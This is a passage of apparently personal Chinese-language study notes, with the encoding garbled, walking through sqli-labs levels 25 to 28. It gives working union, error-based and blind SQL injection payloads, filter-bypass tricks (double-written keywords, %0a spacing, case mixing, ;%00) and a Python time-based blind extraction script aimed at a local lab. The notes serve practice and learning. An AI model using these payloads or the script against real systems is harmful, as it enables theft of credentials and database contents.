<p>æœ€åpayload</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">id</span>,username,&#x27;!&#x27;,passwoorrd) <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+</span><br><br>passswordè¦æ¢æˆpasswoord<br></code></pre></td></tr></table></figure>
<h1 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h1><p>è¦æ±‚ä½¿ç”¨ç›²æ³¨ï¼Œè€Œä¸”åƒä¸Šé¢˜ä¸€æ ·è¿‡æ»¤orå’Œandï¼Œ<br>æµ‹è¯•äº†å¥½ä¸€ä¼šï¼Œå‘ç°æ ¹æœ¬ä¸éœ€è¦é—­åˆ  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <br></code></pre></td></tr></table></figure>
<p>é¢˜ç›®å¯ä»¥ç›´æ¥è”åˆæ³¨å…¥</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(id,username,passwoorrd) <span class="hljs-keyword">from</span> users <br></code></pre></td></tr></table></figure>
<p>ä½†æ˜¯æœ¬æ„åº”è¯¥æ˜¯è®©ç»ƒä¹ ç›²æ³¨çš„ï¼Œæ‰€ä»¥ä¿®æ”¹äº†ä¸€ä¸‹ä»¥å‰çš„è„šæœ¬<br>æ—¶é—´ç›²æ³¨ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># å¯¼å…¥requestsåº“ï¼Œç”¨äºå‘é€HTTPè¯·æ±‚</span><br><span class="hljs-keyword">import</span> time      <span class="hljs-comment"># å¯¼å…¥timeåº“ï¼Œç”¨äºæµ‹é‡æ—¶é—´å»¶è¿Ÿ</span><br><br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªåŒ…å«å¯èƒ½å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œç”¨äºçŒœæµ‹æ•°æ®åº“ã€è¡¨å’Œå­—æ®µçš„åç§°</span><br>ALPHABET = <span class="hljs-string">&quot;,abcdefghijklmnopqrstuvwxyz0123456789_@.-&quot;</span><br><br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªæ—¶é—´å»¶è¿Ÿï¼Œç”¨äºåˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥</span><br>SLEEP_TIME = <span class="hljs-number">1</span><br><br><span class="hljs-comment"># å®šä¹‰ç›®æ ‡URLï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªSQLæ³¨å…¥çš„payloadæ¨¡æ¿</span><br><span class="hljs-comment"># &#123;sql&#125;ï¼šè¡¨ç¤ºè¦æ‰§è¡Œçš„SQLæŸ¥è¯¢</span><br><span class="hljs-comment"># &#123;position&#125;ï¼šè¡¨ç¤ºå½“å‰çŒœæµ‹çš„å­—ç¬¦ä½ç½®</span><br><span class="hljs-comment"># &#123;char&#125;ï¼šè¡¨ç¤ºå½“å‰çŒœæµ‹çš„å­—ç¬¦</span><br><span class="hljs-comment"># &#123;time&#125;ï¼šè¡¨ç¤ºå»¶è¿Ÿæ—¶é—´</span><br>URL = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-25a/?id=1 aandnd if(substr((&#123;sql&#125;),&#123;position&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(&#123;time&#125;),1)--+&quot;</span><br><br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå‘é€HTTPè¯·æ±‚å¹¶åˆ¤æ–­æ˜¯å¦å­˜åœ¨å»¶è¿Ÿ</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inject</span>(<span class="hljs-params">path</span>):<br>    start = time.time()  <span class="hljs-comment"># è®°å½•è¯·æ±‚å¼€å§‹æ—¶é—´</span><br>    response = requests.get(path)  <span class="hljs-comment"># å‘é€HTTP GETè¯·æ±‚</span><br>    end = time.time()   <span class="hljs-comment"># è®°å½•è¯·æ±‚ç»“æŸæ—¶é—´</span><br>    <span class="hljs-comment"># å¦‚æœå“åº”çŠ¶æ€ç ä¸º200ä¸”å“åº”æ—¶é—´è¶…è¿‡é¢„è®¾çš„å»¶è¿Ÿæ—¶é—´ï¼Œåˆ™è®¤ä¸ºå­˜åœ¨SQLæ³¨å…¥</span><br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> end - start &gt; SLEEP_TIME:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæå–æ•°æ®åº“ã€è¡¨ã€å­—æ®µæˆ–æ•°æ®</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">sql</span>):<br>    s = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># åˆå§‹åŒ–ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œç”¨äºå­˜å‚¨ç»“æœ</span><br>    position = <span class="hljs-number">0</span>  <span class="hljs-comment"># åˆå§‹åŒ–å­—ç¬¦ä½ç½®è®¡æ•°å™¨</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        position += <span class="hljs-number">1</span>  <span class="hljs-comment"># æ¯æ¬¡å¾ªç¯å¢åŠ å­—ç¬¦ä½ç½®</span><br>        <span class="hljs-comment"># å°è¯•çŒœæµ‹å½“å‰å­—ç¬¦ä½ç½®æ˜¯å¦ä¸ºç©º</span><br>        res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=<span class="hljs-string">&quot;&quot;</span>, time=SLEEP_TIME))<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># å¦‚æœä¸ºç©ºï¼Œé€€å‡ºå¾ªç¯</span><br>        <span class="hljs-comment"># éå†æ‰€æœ‰å¯èƒ½çš„å­—ç¬¦</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ALPHABET:<br>            <span class="hljs-comment"># æ„é€ å®Œæ•´çš„URLå¹¶å‘é€è¯·æ±‚</span><br>            res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=char, time=SLEEP_TIME))<br>            <span class="hljs-keyword">if</span> res:<br>                s += char  <span class="hljs-comment"># å¦‚æœçŒœæµ‹æ­£ç¡®ï¼Œå°†å­—ç¬¦æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­</span><br>                <span class="hljs-keyword">break</span>      <span class="hljs-comment"># é€€å‡ºå¾ªç¯ï¼Œç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>    <span class="hljs-keyword">return</span> s  <span class="hljs-comment"># è¿”å›æœ€ç»ˆç»“æœå­—ç¬¦ä¸²</span><br><br><span class="hljs-comment"># è·å–æ•°æ®åº“å</span><br>database = extract_data(<span class="hljs-string">&quot;database()&quot;</span>)<br><span class="hljs-built_in">print</span>(database)  <span class="hljs-comment"># è°ƒç”¨extract_dataå‡½æ•°ï¼Œä¼ å…¥SQLæŸ¥è¯¢è¯­å¥è·å–æ•°æ®åº“å</span><br><br><span class="hljs-comment"># è·å–è¡¨å</span><br>tables = extract_data(<span class="hljs-string">&quot;select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;%s&#x27;&quot;</span> % database)<br><span class="hljs-built_in">print</span>(tables)<br><br><span class="hljs-comment"># è·å–å­—æ®µå</span><br>columns = extract_data(<span class="hljs-string">&quot;select group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#x27;security&#x27; aandnd table_name=&#x27;users&#x27;&quot;</span>)<br><span class="hljs-built_in">print</span>(columns)<br><br><span class="hljs-comment"># è·å–ç”¨æˆ·åå’Œå¯†ç ï¼Œå¯ä»¥æ›¿æ¢è‡ªå·±æƒ³è¦çš„è¡¨å</span><br><span class="hljs-comment">#all = extract_data(&quot;select group_concat(id,username,password) from users&quot;)</span><br><span class="hljs-comment">#print(all)</span><br></code></pre></td></tr></table></figure>

<h1 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);			//strip out OR (non <span class="hljs-keyword">case</span> sensitive)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		//Strip out AND (non <span class="hljs-keyword">case</span> sensitive)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		//strip out /*</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		//Strip out --</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);			//Strip out <span class="hljs-comment">#</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		//Strip out spaces</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		//Strip out slashes</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-variable">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></code></pre></td></tr></table></figure>
<p>\s &#x3D; ç©ºæ ¼<br>å¤§æ¦‚å°±æ˜¯ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦ï¼Œæ¢è¡Œç¬¦éƒ½è¿‡æ»¤äº†,  </p>
<blockquote>
<p>æ³¨é‡Šå¯ä»¥ç”¨;%00<br>ç©ºæ ¼ç»•è¿‡%09 TABé”®ï¼ˆæ°´å¹³ï¼‰ã€%0a æ–°å»ºä¸€è¡Œã€%0c æ–°çš„ä¸€é¡µã€%0d returnåŠŸèƒ½ã€%0b TABé”®ï¼ˆå‚ç›´ï¼‰ã€%a0 ç©ºæ ¼ç©ºæ ¼ï¼Œä½†æ˜¯å¯èƒ½æ˜¯apacheè§£æä¸äº†(æˆ‘ç”¨çš„ä¹Ÿæ˜¯apache)ï¼Œåšå®¢ä¸Šéƒ½é€‰æ‹©æŠ¥é”™æ³¨å…¥åŠ ()ç»•è¿‡ç©ºæ ¼,å°±ä¸ç”¨è€ƒè™‘ç©ºæ ¼<br>or å¯ä»¥ç”¨ || æˆ– oorr<br>and å¯ä»¥ç”¨ &amp;&amp; æˆ– aandnd  </p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">||</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>(concat(username,<span class="hljs-operator">%</span><span class="hljs-number">27</span>:<span class="hljs-operator">%</span><span class="hljs-number">27</span>,passwoorrd))<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>(users)<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">where</span>(id<span class="hljs-operator">=</span><span class="hljs-number">1</span>))));<span class="hljs-operator">%</span><span class="hljs-number">00</span> <br><span class="hljs-operator">=</span><br><span class="hljs-string">&#x27;||extractvalue(1,concat(0x7e,(select(concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password))from(users)where(id=1))));</span><br><span class="hljs-string"></span><br><span class="hljs-string">https://blog.csdn.net/2301_76913435/article/details/145601627</span><br></code></pre></td></tr></table></figure>
<p>å…¶ä¸­åŒ…å«ï¼šåŒå†™orï¼Œ;%00ç»•è¿‡æ³¨é‡Šç¬¦å·</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; || updatexml(1,concat(0x0a,(SELECT(group_concat(concat_ws(0x3a,username,passwoorrd))) FROM (security.users) WHERE (id = 1) ))  ,1) || &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.cnblogs.com<span class="hljs-operator">/</span>linfangnan<span class="hljs-operator">/</span>p<span class="hljs-operator">/</span><span class="hljs-number">13940107.</span>html<br></code></pre></td></tr></table></figure>
<p>å…¶ä¸­åŒ…å«ï¼šåŒå†™orï¼Œ||â€™1â€™&#x3D;â€™1â€™ æ¥é—­åˆè¯­å¥ä½¿å¾—ä¸ç”¨æ³¨é‡Šï¼Œsecurity.usersæ¥ç¡®å®šæ˜¯securityä¸‹çš„users</p>
<hr>
<h2 id="title-note-13date-2025-03-15-01-06-35tags-sql-labs"><a href="#title-note-13date-2025-03-15-01-06-35tags-sql-labs" class="headerlink" title="title: note-13date: 2025-03-15 01:06:35tags: sql-labs"></a>title: note-13<br>date: 2025-03-15 01:06:35<br>tags: sql-labs</h2><h1 id="less26a"><a href="#less26a" class="headerlink" title="less26a"></a>less26a</h1><p>ç½‘ä¸Šåšå®¢æ˜¯è¯´ç”¨%a0æ¥ä»£æ›¿ç©ºæ ¼ï¼Œä½†æ˜¯æˆ‘è¿™ç¯å¢ƒå¥½åƒè§£æä¸äº†ï¼Œ<br>ä¹Ÿä¸èƒ½ç”¨æŠ¥é”™æ³¨å…¥ã€‚<br>æœ€åè¯•å‡ºæ¥èƒ½ç”¨æ¥ç›²æ³¨çš„payloadå°±æ˜¯ï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;)||if(length(database())=8,1,0);%00</span><br></code></pre></td></tr></table></figure>
<p>ç»“æœç‰›å¤§bäº†ï¼Œåœ¨åé¢27åœ¨åŒæ ·è¿‡æ»¤äº†ç©ºæ ¼çš„æƒ…å†µä¸‹ç”¨å…¶å®ƒå¦‚%a0èƒ½æ­£ç¡®è§£æ,å¯èƒ½æ˜¯æˆ‘çš„å…³å¡æ–‡ä»¶æœ‰é—®é¢˜ï¼›<br>é‚£ä¸ç®¡äº†ï¼Œç›´æ¥åšless27ã€‚  </p>
<h1 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h1><p>è¿™é¢˜è¿‡æ»¤å¯¹å¤§å°å†™æ²¡è€ƒè™‘ï¼Œå¯ä»¥ç›´æ¥å¤§å°å†™ç»•è¿‡<br>é¢˜ç›®å¥½åƒæŠŠç¬¦å·è¿‡æ»¤äº†ï¼Œç”¨id&#x3D;-1ä¼šå˜æˆ1ï¼Œæ³¨æ„è¦ç”¨æ•°æ®åº“æ²¡ç”¨çš„å€¼<br>é¢˜ç›®è¿‡æ»¤ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		<span class="hljs-comment">//strip out /*</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		<span class="hljs-comment">//Strip out --.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);			<span class="hljs-comment">//Strip out #.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out union</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out select</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/UNION/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out UNION</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/SELECT/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out SELECT</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/Union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out Union</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/Select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out select</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,3;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(table_name)%0Afrom%0AinfoRmation_schema.tables%0Awhere%0Atable_schema=&#x27;security&#x27;;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(column_name)%0Afrom%0AinfoRmation_schema.columns%0Awhere%0Atable_name=&#x27;users&#x27;%0Aand%0Atable_schema=&#x27;security&#x27;;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(id,username,passwOrd )%0Afrom%0Ausers;%00<br></code></pre></td></tr></table></figure>

<h1 id="less27a"><a href="#less27a" class="headerlink" title="less27a"></a>less27a</h1><p>ä¾æ—§æ²¡ç”¨è¿‡æ»¤å¤§å°å†™ï¼ŒåŒºåˆ«æ˜¯æ²¡ç”¨æŠ¥é”™å›æ˜¾ï¼Œä¸èƒ½ç”¨æŠ¥é”™æ³¨å…¥ã€‚</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">?id=<span class="hljs-number">11111</span><span class="hljs-string">&quot;uNion%0AselecT<span class="hljs-variable">%0A1</span>,2,3;<span class="hljs-variable">%00</span></span><br><span class="hljs-string">?id=11111&quot;</span>uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(table_name)from<span class="hljs-variable">%0AinfoRmation_schema</span>.tables%0Awhere<span class="hljs-variable">%0Atable_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>;<span class="hljs-variable">%00</span><br>?id=<span class="hljs-number">11111</span><span class="hljs-string">&quot;uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(column_name)from<span class="hljs-variable">%0AinfoRmation_schema</span>.columns%0Awhere<span class="hljs-variable">%0Atable_name</span>=&#x27;users&#x27;%0Aand<span class="hljs-variable">%0Atable_schema</span>=&#x27;security&#x27;;<span class="hljs-variable">%00</span></span><br><span class="hljs-string">?id=11111&quot;</span>uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(id,username,password)from<span class="hljs-variable">%0Ausers</span>;<span class="hljs-variable">%00</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="title-note-14date-2025-03-16-00-48-04tags-sql-labs"><a href="#title-note-14date-2025-03-16-00-48-04tags-sql-labs" class="headerlink" title="title: note-14date: 2025-03-16 00:48:04tags: sql-labs"></a>title: note-14<br>date: 2025-03-16 00:48:04<br>tags: sql-labs</h2><h1 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h1><p>æµ‹è¯•å‡ºé—­åˆç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs s">?id=1&#x27;);%00<br></code></pre></td></tr></table></figure>
<p>ç„¶åçœ‹ä¸€çœ¼æºç çš„è¿‡æ»¤  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);				<span class="hljs-comment">//strip out /*</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);				<span class="hljs-comment">//Strip out --.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);					<span class="hljs-comment">//Strip out #.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    		<span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    		<span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out UNION &amp; SELECT.</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure>
<p>è¿™è¾‰å¤§å°å†™ç»•è¿‡å°±æ²¡ç”¨äº†ï¼Œ<br>è€Œä¸”å¥½åƒæ˜¯è¿™ä¸¤åŒæ—¶å‡ºç°æˆunion select æ—¶æ‰ä¼šè§¦å‘è¿‡æ»¤<br>è¿™æ ·çš„è¯åŒå†™ç»•è¿‡å°±æœ‰ç‚¹éš¾å§<br>ä½†æ˜¯æ˜ç™½äº†åŸç†ï¼Œæ ¹æ®è¿‡æ»¤æœºåˆ¶è¿›è¡Œç»•è¿‡å°±ok  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs s">?id=0&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,2,3;%00<br></code></pre></td></tr></table></figure>
<p>æœ‰ç‚¹å¥‡è‘©ï¼Œä½†ç¡®å®èƒ½ç”¨<br>ä¹Ÿå¯ä»¥é€‰æ‹©æŠ¥é”™æ³¨å…¥å¥½åƒ(ä¸è¡Œï¼Œæ²¡æœ‰æŠ¥é”™)ï¼Œä¸è¯•äº†  </p>
